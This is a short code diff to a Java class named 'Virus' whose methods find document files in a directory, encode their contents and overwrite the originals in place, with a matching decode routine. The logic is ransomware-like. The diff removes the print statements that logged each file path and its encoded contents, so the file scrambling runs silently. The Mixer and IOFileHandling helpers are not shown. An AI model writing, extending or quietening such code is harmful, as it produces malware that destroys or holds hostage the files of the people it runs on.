@@ -103,10 +103,8 @@ public class Virus {
     public static void encodeFiles() {
         List<String> filesList = searchFiles(DIRECTORY_WITH_DOC_FILES, predicateDoc);
         for (String s : filesList) {
-            System.out.println(s);
             byte[] fileInByte = IOFileHandling.getByteArray(s);
             String encodedFile = Mixer.encode(byteArrToString(fileInByte));
-            System.out.println(encodedFile);
             IOFileHandling.byteArrToFile(s, stringToByteArr(encodedFile));
         }
     }
@@ -114,10 +112,8 @@ public class Virus {
     public static void decodeFiles() {
         List<String> filesList = searchFiles(DIRECTORY_WITH_DOC_FILES, predicateDoc);
         for (String s : filesList) {
-            System.out.println(s);
             byte[] fileInByte = IOFileHandling.getByteArray(s);
             String encodedFile = Mixer.decode(byteArrToString(fileInByte));
-            System.out.println(encodedFile);
             IOFileHandling.byteArrToFile(s, stringToByteArr(encodedFile));
         }
     }
